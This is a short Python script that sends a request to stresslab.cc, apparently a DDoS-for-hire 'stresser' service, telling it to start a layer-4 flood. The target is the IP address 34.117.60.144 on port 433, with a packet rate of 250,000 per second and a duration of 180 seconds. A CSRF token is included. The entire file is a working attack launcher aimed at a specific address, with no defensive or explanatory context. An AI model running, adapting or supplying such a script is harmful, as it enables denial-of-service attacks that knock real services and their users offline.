import requests

payload = {
    "host": "34.117.60.144",
    "port": "433",
    "method": "l4_545",
    "pps": "250000",
    "time": "180",
    "power": "100",
    "subnet": "32",
    "schedule": False,
    "date": "",
    "datetime": "",
    "CSRF": "b94694898967e1086cfe7ac0def295807a4fa0ace0b62c87ec8bcedd98a7c135"
}

url = "https://stresslab.cc/u/inc/startL4"

response = requests.post(url, json=payload)

print(response.text)